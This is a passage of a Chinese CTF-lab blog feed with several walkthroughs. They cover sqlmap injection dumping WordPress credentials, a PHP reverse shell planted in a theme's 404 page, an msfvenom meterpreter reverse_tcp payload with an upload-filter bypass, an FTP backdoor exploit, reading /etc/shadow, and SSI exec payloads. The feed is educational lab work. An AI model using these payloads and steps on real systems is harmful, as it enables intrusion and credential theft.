src="https://img-blog.csdnimg.cn/20200731223046214.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到框，就猜想是否可能存在SQL注入和xss<br>先将信息全部扫描一遍在做深入探测。<br>phpmyadmin则是普通的mysql的管理登录页面，而且弱口令尝试一遍是不可以登录成功的。<br><img src="https://img-blog.csdnimg.cn/20200731220629883.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>同时，dirb也扫描出很多敏感信息，一一访问查看敏感信息。<br><img src="https://img-blog.csdnimg.cn/20200731221018229.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>8080端口开放的也是http服务，所以也同样使用nikto和dirb进行扫描<br>查看敏感信息<br><img src="https://img-blog.csdnimg.cn/20200801011324946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>发现了wordpress目录，访问后发现是一个普通的wordpress界面，大致浏览一遍应该是一个个人的网站。<br><img src="https://img-blog.csdnimg.cn/20200731221540726.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有发现什么其他的敏感信息。</p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>使用Owasp-zap漏洞扫描器进行漏洞扫描<br><img src="https://img-blog.csdnimg.cn/20200731223207137.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>先对80端口进行探测<br><img src="https://img-blog.csdnimg.cn/202007312232527.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>没有发现高危漏洞，在扫描一下8080端口<br><img src="https://img-blog.csdnimg.cn/20200731223339192.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>依旧是没有发现什么高危的漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>信息探测基本完成，现在对探测到的信息进行利用，查看可利用的信息进行深入研究。<br>mysql的管理界面目前没有头绪，看登录框吧，尝试进行SQL注入。<br>可以使用sqlmap进行注入<br>首先抓取对应数据包，使用burpsuite截获数据包<br>开启代理，抓包。<br><img src="https://img-blog.csdnimg.cn/20200731224258411.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后将返回的数据包复制出来，在桌面创建一个<code>request.raw</code><br>将内容粘贴进去保存。<br><img src="https://img-blog.csdnimg.cn/20200731224554371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用sqlmap进行注入</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r request<span class="token punctuation">.</span>raw <span class="token comment">--level 5 --risk 3 --dbs --dbms mysql --batch</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020073123190326.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库全部爆破出来了。<br>然后就慢慢来吧。<br>发现那个<code>wordpress8080</code>数据库是wordpress的，所以可以爆出它的值</p><pre class="language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r request<span class="token punctuation">.</span>raw <span class="token comment">--level 5 --risk 3 -D "wordpress8080" --tables --dbms mysql --batch</span>sqlmap <span class="token operator">-</span>r request<span class="token punctuation">.</span>raw <span class="token comment">--level 5 --risk 3 -D "wordpress8080" -T "users" --columns --dbms mysql --batch</span>sqlmap <span class="token operator">-</span>r request<span class="token punctuation">.</span>raw <span class="token comment">--level 5 --risk 3 -D "wordpress8080" -T "users" -C username,password --dump --dbms mysql --batch</span></code></pre><p>最后得到了wordpress的登录用户名和密码<br><img src="https://img-blog.csdnimg.cn/20200801000013675.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>登录wordpress，一般wordpress的登录点是<code>wp-login.php</code><br><img src="https://img-blog.csdnimg.cn/20200801000513685.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>成功登录，然后找到404的界面代码。如下：<br><img src="https://img-blog.csdnimg.cn/20200801000818165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传webshell获取控制权"><a href="#上传webshell获取控制权" class="headerlink" title="上传webshell获取控制权"></a>上传webshell获取控制权</h2><p>获取shell的位置在<code>/usr/share/webshells/php</code><br><img src="https://img-blog.csdnimg.cn/20200801001405191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用这个shell反弹权限<br>copy到桌面<br><img src="https://img-blog.csdnimg.cn/20200801001645536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>只需要将这里改为kali攻击机的IP地址就可以了。<br><img src="https://img-blog.csdnimg.cn/20200801002100912.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后复制出来，粘贴到404界面去。<br><img src="https://img-blog.csdnimg.cn/20200801002313149.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>点击上传就行了。<br><img src="https://img-blog.csdnimg.cn/2020080100240732.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>提示上传成功。<br>启动监听，使用nc进行监听。<br><img src="https://img-blog.csdnimg.cn/20200801002622883.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>访问404的界面<br><code>http://10.0.2.15:8080/wordpress/wp-content/themes/twentythirteen/404.php</code><br>看到浏览器一直在请求，就可以回到终端查看监听状态了。<br><img src="https://img-blog.csdnimg.cn/20200801004147348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>浏览器一直在不断的请求服务，这个时候webshell已经被执行了。<br>查看监听状况<br><img src="https://img-blog.csdnimg.cn/20200801004239323.jpg" alt="m0re" loading="lazy"><br>进行终端优化<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>查看敏感文件信息</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shadow<span class="token function">cat</span> /etc/passwd</code></pre><p><img src="https://img-blog.csdnimg.cn/20200801004825884.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看最后发现一句话<br>“你偷走了我的文件！没有人进来，也没有人出去！”<br>不管它。flag一般都是在root根目录下。<br>所以需要进行提权<br>不过提权需要密码，先尝试空密码<br><img src="https://img-blog.csdnimg.cn/20200801005153480.jpg" alt="m0re" loading="lazy"><br>没成功，但是还有一个密码，就是sqlmap爆出的密码<code>SuperSecretPassword</code><br><img src="https://img-blog.csdnimg.cn/202008010054073.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>提权成功。<br>已经root权限了，找什么不就是轻而易举的了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————FTP服务后门利用及SQL注入</title>
      <link href="/posts/239f0f2a/"/>
      <url>/posts/239f0f2a/</url>
      
        <content type="html"><![CDATA[<p>前言：CTF靶场系列的，这篇是好几次学习总结的。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：<code>192.168.40.132</code><br>靶机：<code>192.168.40.150</code><br>目的当然还是获取靶机的flag</p><h2 id="直接跳过重复步骤"><a href="#直接跳过重复步骤" class="headerlink" title="直接跳过重复步骤"></a>直接跳过重复步骤</h2><p><img src="https://img-blog.csdnimg.cn/20200729131348559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>开放端口和版本信息知道了，开始搜索相应版本的服务是否存在已知漏洞<br><img src="https://img-blog.csdnimg.cn/20200729131604365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>有后门存在的漏洞，先查看一下详细信息。kali中集成部分漏洞库还是比较全的，还方便查看。还可以找网站查询。我习惯用kali了。就没有留网站，现在也找不到了。</p><p><img src="https://img-blog.csdnimg.cn/20200729143405664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个源代码需要修改进行利用，比如这个IP地址，需要修改为靶机的IP，对于新手还是有些难度的。<br><img src="https://img-blog.csdnimg.cn/20200729144705844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以使用第二个，在metasploit中集成的模块进行利用。<br><img src="https://img-blog.csdnimg.cn/20200729161157222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后门利用，选择这个<br>查看并选择一个payload<br><img src="https://img-blog.csdnimg.cn/20200729162424477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>设置好后，继续设置其他的参数，<br>然后开始攻击exploit<br><img src="https://img-blog.csdnimg.cn/20200729163144336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到了root权限<br>优化shell终端也行，不优化也可以。<br>优化代码</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><p>奇怪的是，没有flag了，可能被删了。不纠结这个。<br><img src="https://img-blog.csdnimg.cn/20200729164928924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个是利用FTP服务的后门，来进行攻击，使用metasploit集成的模块进行利用。</p><p>上面是这段时间学习的服务漏洞的一个总结。下面的是常见漏洞</p><h1 id="SQL注入get参数"><a href="#SQL注入get参数" class="headerlink" title="SQL注入get参数"></a>SQL注入get参数</h1><p>SQL注入的产生原因通常表现在以下几个方面：<br>①不当的类型处理<br>②不安全的数据库配置<br>③不合理的查询集处理<br>④不当的错误处理<br>⑤转义字符处理不合适<br>⑥多个提交处理不当</p><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：<code>192.168.40.132</code><br>靶场机器：<code>192.168.40.151</code></p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机服务信息以及服务版本<br><img src="https://img-blog.csdnimg.cn/20200729195118318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>更多信息进行探测<br><img src="https://img-blog.csdnimg.cn/202007291954387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>开启了http服务，可以尝试使用工具进行目录扫描查看敏感信息等操作</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># nikto -host http://192.168.40.151</span>- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          <span class="token number">192.168</span>.40.151+ Target Hostname:    <span class="token number">192.168</span>.40.151+ Target Port:        <span class="token number">80</span>+ Start Time:         <span class="token number">2020</span>-07-29 <span class="token number">19</span>:56:42 <span class="token punctuation">(</span>GMT8<span class="token punctuation">)</span>---------------------------------------------------------------------------+ Server: Apache/2.2.16 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>+ Retrieved x-powered-by header: PHP/5.3.3-7+squeeze14+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME <span class="token builtin class-name">type</span>+ Uncommon header <span class="token string">'tcn'</span> found, with contents: list+ Apache mod_negotiation is enabled with MultiViews, <span class="token function">which</span> allows attackers to easily brute force <span class="token function">file</span> names. See http://www.wisec.it/sectou.php?id<span class="token operator">=</span>4698ebdc59d15. The following alternatives <span class="token keyword">for</span> <span class="token string">'index'</span> were found: index.php+ Apache/2.2.16 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.37<span class="token punctuation">)</span>. Apache <span class="token number">2.2</span>.34 is the EOL <span class="token keyword">for</span> the <span class="token number">2</span>.x branch.+ OSVDB-630: The web server may reveal its internal or real IP <span class="token keyword">in</span> the Location header via a request to /images over HTTP/1.0. The value is <span class="token string">"127.0.0.1"</span><span class="token builtin class-name">.</span>+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="token boolean">false</span> positives.+ Cookie PHPSESSID created without the httponly flag+ OSVDB-5034: /admin/login.php?action<span class="token operator">=</span>insert<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>test<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log <span class="token keyword">in</span> with user <span class="token string">'test'</span> password <span class="token string">'test'</span> to verify.+ OSVDB-12184: /?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?<span class="token operator">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-3268: /css/: Directory indexing found.+ OSVDB-3092: /css/: This might be interesting<span class="token punctuation">..</span>.+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3268: /images/: Directory indexing found.+ Server may leak inodes via ETags, header found with <span class="token function">file</span> /icons/README, inode: <span class="token number">3524</span>, size: <span class="token number">5108</span>, mtime: Tue Aug <span class="token number">28</span> <span class="token number">18</span>:48:10 <span class="token number">2007</span>+ OSVDB-3233: /icons/README: Apache default <span class="token function">file</span> found.+ /admin/login.php: Admin login page/section found.+ <span class="token number">8727</span> requests: <span class="token number">0</span> error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">22</span> item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote <span class="token function">host</span>+ End Time:           <span class="token number">2020</span>-07-29 <span class="token number">19</span>:57:09 <span class="token punctuation">(</span>GMT8<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">27</span> seconds<span class="token punctuation">)</span>---------------------------------------------------------------------------+ <span class="token number">1</span> host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested</code></pre><p>可以查看到很多敏感信息，比如这里的PHP版本是5.3<br>还有一个web页面是<code>/admin/login.php</code>进行访问查看，进行深入挖掘<br><img src="https://img-blog.csdnimg.cn/20200729195926985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>后台登录界面<br>先尝试弱口令，admin等常见弱口令进行尝试，但是没有成功。</p><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>web漏洞扫描器<code>owasp-zap</code><br>是世界上最受欢迎的免费安全工具之一。zap可以帮助我们在开发和测试应用程序的过程中，自动发现web应用中的安全漏洞。另外，他也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。<br><img src="https://img-blog.csdnimg.cn/20200729203806934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>选好后直接进行攻击<br>攻击完成后会自动跳转到这个界面，可以看到有SQL注入，和反射xss等漏洞。颜色不同，漏洞的危险等级也不同。<br><img src="https://img-blog.csdnimg.cn/20200729203958605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这里只进行查看SQL注入的漏洞。使用sqlmap进行探测。<br><img src="https://img-blog.csdnimg.cn/20200729212247268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用sqlmap进行注入就是快很多，账号密码也得到了，可以进行登录了。<br><img src="https://img-blog.csdnimg.cn/20200729212444179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传shell反弹权限"><a href="#上传shell反弹权限" class="headerlink" title="上传shell反弹权限"></a>上传shell反弹权限</h2><pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.40.132 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f raw</code></pre><p>然后保存生成的shell到桌面<br>启动监听</p><pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.40.132run</code></pre><p><img src="https://img-blog.csdnimg.cn/2020072922041881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>正在监听<br>上传shell执行shell<br><img src="https://img-blog.csdnimg.cn/20200729221200723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现描述——不是PHP</p><ul><li>绕过过滤机制们利用<code>.php</code>修改为<code>.PHP</code><br><img src="https://img-blog.csdnimg.cn/20200729221605466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>成功了，查看侦听端口<br><img src="https://img-blog.csdnimg.cn/20200729221821265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>完全没问题。<br>使用shell，可以控制终端命令行<br>然后尝试去到root目录找flag<br><img src="https://img-blog.csdnimg.cn/20200729222125140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>发现权限不够，需要提权。<br>不过这个只是进行SQL注入。提权再另说。<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li></ul><ol><li>靶场机器如果存在SQL注入漏洞，可以利用sqlmap进行获取数据；</li><li>获得靶场机器shell后，可以分析是否需要提权。如果在当前权限下可以得到flag，那么就不需要提权；</li><li>SQL注入往往要和上传漏洞配合，上传shell。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF————Web安全SSI注入</title>
      <link href="/posts/b4cfe3c7/"/>
      <url>/posts/b4cfe3c7/</url>
      
        <content type="html"><![CDATA[<p>本文首发<a href="https://www.freebuf.com/">FreeBuf.COM</a><br>原本地址——🍗<a href="https://www.freebuf.com/articles/network/245231.html">CTF——Web安全SSI注入</a></p><p>前言：如何从外部进入主机</p><h1 id="SSI注入攻击介绍"><a href="#SSI注入攻击介绍" class="headerlink" title="SSI注入攻击介绍"></a>SSI注入攻击介绍</h1><h2 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a>简单理解</h2><p>SSI(server side inject)的出现是为了赋予HTML静态页面动态的效果，通过SSI来执行系统命令；并返回对应的结果。</p><p>如果再网站目录中发现了<code>.stm；.shtm；.shtml；</code>这样的文件后缀名，并且网站对于SSI的输入没有做到严格过滤或者过滤不充分；很有可能被SSI注入攻击。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>①显示服务器端环境变量<code>&lt;#echo&gt;</code></p><p>本文档名称：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DOCUMENT_NAME<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><p>现在时间：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DATE_LOCAL<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><p>显示IP地址：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#echo</span> <span class="token attr-name">var</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>REMOTE_ADDR<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><p>②将文本内容直接插入到文档中<code>&lt;#include&gt;</code></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#include</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--#include virtual="index.html" --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#include</span> <span class="token attr-name">virtual</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--#include virtual="/www/footer.html" --></span></code></pre><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><p>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</p><p>文件最近更新日期：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!</span> <span class="token attr-name">#flastmod</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><p>文件的长度：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#fsize</span> <span class="token attr-name">file</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><p>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#exec</span> <span class="token attr-name">cmd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--#exec cmd="cat /etc/passwd"--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!–#exec</span> <span class="token attr-name">cgi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>文件名称<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!--#exec</span> <span class="token attr-name">cgi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/cgi-bin/access_log.cgi<span class="token punctuation">"</span></span><span class="token attr-name">–</span><span class="token punctuation">></span></span></code></pre><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击机：kali <code>10.0.2.4</code></p><p>靶场机器：linux<code>10.0.2.15</code></p><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>扫描主机服务信息以及服务版本</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token punctuation">[</span>ip<span class="token punctuation">]</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020080117460350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>可以看出靶场机器开放了80端口并且操作系统是ubuntu</p><p>快速扫描主机全部信息</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A -v <span class="token punctuation">[</span>ip<span class="token punctuation">]</span></code></pre><p><img src="https://img-blog.csdnimg.cn/2020080117462391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>既然是开启的http服务，那么就应该是可以访问的，思路就是可以在浏览器直接访问查看有没有可以利用的信息，并且扫描结果显示robots协议中发现一个信息。有时候还会在源代码中藏有信息。<br><img src="https://img-blog.csdnimg.cn/20200801174704296.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>这个在默认界面没有发现信息，但是robots中发现了目录<code> /spukcab</code><br><img src="https://img-blog.csdnimg.cn/20200801174719735.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>挨个查看，看看有无敏感信息。可以下载下来，more查看内容，发现一个可能有用的信息，根据前几次的经验，这里可能是个用户名<code>webmaster</code>；只是可能。还有就是站点根目录的位置已经得到了。<br><img src="https://img-blog.csdnimg.cn/20200801174735787.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" 